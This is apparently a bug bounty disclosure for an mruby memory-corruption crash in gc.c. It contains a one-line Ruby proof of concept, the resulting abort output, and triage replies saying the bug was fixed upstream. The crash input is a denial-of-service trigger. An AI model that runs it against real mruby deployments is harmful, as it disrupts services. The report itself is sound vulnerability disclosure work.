title: SIGABRT - mrb_realloc_simple - gc.c - line:201
vulnerability_information:
Explain
------------------
I downloaded "mruby-master" on 14/01/2017.

PoC
-------------------

The following code triggers the bug (attached as memory_corruption.rb):

	d b = Hash.new {|s,k| s[k] }[1]

Crash - mirb - mruby
-------------------

	x@x:~/Desktop/research/mruby/bin$ ./mirb memory_corruption.rb 
	mirb - Embeddable Interactive Ruby Shell

	*** Error in `./mirb': realloc(): invalid next size: 0x0000000000ecc250 ***
	Aborted (core dumped)
	x@x:~/Desktop/research/mruby/bin$ ./mruby memory_corruption.rb 
	*** Error in `./mruby': realloc(): invalid next size: 0x0000000002204400 ***
	Aborted (core dumped)

Debug - mirb
--------------------

Impact
--------------------

As far as I can see, it is not exploitable. But it can cause DoS.

activities.message:
Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.

Due to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!
Thank you for your report. We've reproduced the crash and opened an issue upstream: https://github.com/mruby/mruby/issues/3421

Thanks again for your report. This issue was resolved upstream in https://github.com/mruby/mruby/commit/719f700adf7598d0ad910dcd3a94aad2ef354033

As far as I can tell, the supplied PoC did not affect the sandbox due to its memory quota.

Our next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.
Thanks for helping improve the security of the MRuby project!
